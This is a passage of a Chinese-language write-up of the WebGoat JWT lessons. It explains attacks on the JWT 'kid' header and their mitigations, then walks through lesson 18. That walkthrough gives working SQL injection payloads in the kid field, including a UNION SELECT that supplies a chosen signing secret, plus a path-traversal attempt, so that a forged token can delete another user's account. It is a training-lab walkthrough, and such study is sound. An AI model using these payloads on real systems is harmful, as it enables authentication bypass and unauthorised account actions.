  "kid": "my_rsa_key"
}
```

### 漏洞

当 `kid` 声明被滥用时，通常意味着其值被操纵以指向一个与用于签署令牌的密钥不同的密钥。这种操纵可能导致多种安全问题：

*   **密钥混淆攻击**：在此攻击中，攻击者操纵 `kid` 声明的值，使其指向一个与签名所用密钥不同的密钥。结果，JWT 的接收方将使用错误的密钥验证签名，从而使攻击者能够冒充其他用户或执行未经授权的操作。
*   **密钥枚举**：如果 `kid` 声明未得到适当保护，或者其值只是一个递增的数字或容易预测的值，攻击者可能会尝试猜测或枚举有效的 `kid` 值。通过这样做，他们可能伪造具有不同 `kid` 值的 JWT，以发现系统中的漏洞或弱点。
*   **密钥欺骗**：在此攻击中，攻击者制作一个带有伪造 `kid` 声明的 JWT，该声明指向一个不存在或无效的密钥。目的是绕过签名验证，并可能获得对资源或功能的未授权访问。
*   **密钥覆盖**：攻击者可能尝试在令牌传输或处理过程中覆盖或修改 `kid` 声明，使其指向与原始意图不同的密钥。这种操纵可能导致签名验证失败或其他安全问题。
*   **无 kid 令牌**：如果系统不要求存在 `kid` 声明，攻击者可能尝试创建一个根本不包含 `kid` 声明的 JWT。如果接收方假设使用默认或已知的密钥（这可能不安全），这种遗漏可能导致漏洞。
*   **不安全的密钥存储**：如果 `kid` 声明与其他薄弱的安全实践（例如以明文存储密钥或使用弱加密）结合使用，攻击者可能会获取有效的 `kid` 值并利用相关联的密钥。

#### 利用步骤

1.  识别 kid 端点：攻击者必须首先在应用程序的 JWT 处理逻辑或任何暴露的配置中找到 kid 端点。
2.  生成恶意 JWT：制作一个带有恶意声明的 JWT，通过更改或添加声明来获取未经授权的访问或提升权限。
3.  生成能使您知晓验证密钥的 kid。
4.  将 JWT 发送至服务器：将带有恶意声明的 JWT 发送到服务器。
5.  服务器验证：服务器在收到 JWT 后，使用“被精心构造的” KID 来验证签名。
6.  攻击成功：如果服务器使用弱密钥或被操纵的密钥来验证 JWT，攻击者将获得未经授权的访问或执行其预期的利用。

### 缓解措施

为防止利用 KID 的 JWT 声明滥用，开发人员和安全专业人员应遵循以下最佳实践：

*   验证：始终验证 `kid` 声明，并确保其指向一个受信任的、适合用于签名验证的密钥。
*   密钥轮换：定期轮换用于签署 JWT 的密钥，并相应更新相关的 `kid` 声明。
*   使用强密钥：确保使用强密码学密钥来签署令牌。
*   访问控制：限制对密钥和签名服务的访问，仅限授权人员。
*   速率限制：实施速率限制，以防止攻击者遍历可能的 `kid` 值。
*   监控：监控和记录 JWT 相关活动，以检测潜在的滥用或可疑行为。

通过遵循这些最佳实践，您可以降低因 `kid` 字段导致的 JWT 声明滥用风险，并增强系统的整体安全性。

## 18. 动手尝试...

下方您会看到两个账户，一个是 Jerry 的，另一个是 Tom 的。Jerry 想要从 Twitter 上删除 Tom 的账户，但他的令牌只能删除自己的账户。您能否尝试帮助他删除 Tom 的账户？

与 16. 相同，头部注入使用 kid 而不是 JKU。

尝试使用删除功能时的消息
```http
POST /WebGoat/JWT/kid/delete?token=eyJ0eXAiOiJKV1QiLCJraWQiOiJ3ZWJnb2F0X2tleSIsImFsZyI6IkhTMjU2In0.ewogICJpc3MiOiAiV2ViR29hdCBUb2tlbiBCdWlsZGVyIiwKICAiaWF0IjogMTUyNDIxMDkwNCwKICAiZXhwIjogMTYxODkwNTMwNCwKICAiYXVkIjogIndlYmdvYXQub3JnIiwKICAic3ViIjogImplcnJ5QHdlYmdvYXQuY29tIiwKICAidXNlcm5hbWUiOiAiSmVycnkiLAogICJFbWFpbCI6ICJqZXJyeUB3ZWJnb2F0LmNvbSIsCiAgIlJvbGUiOiBbCiAgICAiQ2F0IgogIF0KfQ.CgZ27DzgVW8gzc0n6izOU638uUCi6UhiOJKYzoEZGE8 HTTP/1.1
Host: localhost:3000
```
解码为
```json
{
    "typ": "JWT",
    "kid": "webgoat_key",
    "alg": "HS256"
}
{
  "iss": "WebGoat Token Builder",
  "iat": 1524210904,
  "exp": 1618905304,
  "aud": "webgoat.org",
  "sub": "jerry@webgoat.com",
  "username": "Jerry",
  "Email": "jerry@webgoat.com",
  "Role": [
    "Cat"
  ]
}
```

`kid`可能为文件名或数据库查询参数

尝试对`kid`字段进行路径遍历到`/dev/null`，并使用空字节签名，响应 500

尝试对`kid`字段进行 SQL 注入：
1. 对基准字符串`webgoat_key`，进行修改以探测
    - 若删除一部分则报错
    - 使用 SQL 字符串连接符`+`、` `、`||` 响应 200，匹配之前 SQL 挑战的模式
    - 在字符串后添加字符则报错，`webgoat_key'--` 响应 200
    - 使用经典的布尔值探测
        `webgoat_key' AND 1=1--` 200
        `webgoat_key' AND 1=2--` 500
2. 获取查询上下文
    - 使用 `ORDER BY` 确认查询列数量为 1
        `webgoat_key' ORDER BY 1--`
3. 此处为 `WHERE` 子句内，应用程序检索名称并得到密钥值（Base64）。
    1. 设置原查询语句为空，使用 `UNION` 查询设置自定义返回值`Zm9vYmFy`（foobar的Base64编码）。
    2. 创建秘密为`foobar`的对称密钥。在修改 JWT 后签名
        `notexist' UNION SELECT 'Zm9vYmFy'--`
        正如之前 SQL 挑战已知，这里无法单独使用 `SELECT`而不添加`FROM`
    3. 在联合查询中添加一个存在的表名，由于选择语句为常量，只需存在即可。
        此处选择元数据表 `information_schema.tables`
        `notexist' UNION SELECT 'Zm9vYmFy' FROM information_schema.tables--`
    4. 确保修改了 JWT 的过期字段与用户名后，发送并通过挑战。

应用程序使用 `kid` 字段值进行 SQL 查询以得到密钥值（Base64），注入使原查询为空的自定义联合查询，应用程序将使用自定义值对 JWT 进行检测。使用自定义值（明文）作为秘密构建对称密钥（Base64）对 JWT 进行签名。

## 19. 最佳实践

使用 JWT 时的一些最佳实践：

*   固定算法：不要允许客户端切换算法。
*   密钥长度：当使用对称密钥签署令牌时，确保使用合适的密钥长度。
*   声明内容：确保添加到令牌中的声明不包含个人信息。如果需要添加更多信息，请选择同时对令牌进行加密。
*   测试用例：在您的项目中添加充分的测试用例，以验证无效令牌确实无法工作。与第三方集成来检查您的令牌，并不意味着您完全不需要测试自己的应用程序。
*   参考规范：请查看 https://tools.ietf.org/html/rfc8725#section-2 中提及的最佳实践。
